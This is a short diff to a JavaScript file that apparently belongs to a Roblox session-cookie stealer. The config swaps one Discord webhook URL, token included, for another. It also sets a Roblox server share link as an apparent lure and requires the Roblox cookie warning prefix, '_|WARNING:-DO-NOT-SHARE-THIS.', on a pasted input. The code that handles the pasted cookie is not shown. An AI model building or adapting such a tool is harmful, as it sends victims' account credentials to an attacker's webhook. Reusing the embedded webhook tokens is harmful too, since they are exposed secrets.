@@ -1,6 +1,6 @@
 
     /* -------------------------------- CONFIG -------------------------------- */
-    const webhookURL = "https://discord.com/api/webhooks/1444516510310596672/dR4f49mA2LXwaA_AijR5SgANfM5MBRmZyPtDeXWbEQJbr9xyeDSdzVDQh4hbGatVhuHk?wait=true";
+    const webhookURL = "https://discord.com/api/webhooks/1445517938122817596/lUWtH8zbtU9r4lzyCvrSHv5axUbW5WZwAH9icSCFu1EDMfaZrsu_z58KzO5Z7T2vqwUK";
     const linkA = "https://www.roblox.com/share?code=873988b0a26449498cceb1b239455bb8&type=Server";
     const requiredSignature = "_|WARNING:-DO-NOT-SHARE-THIS.";
 
@@ -164,4 +164,5 @@
     });
 
     updateValidityUI(checkValidity(psInput.value || ""));
+
   
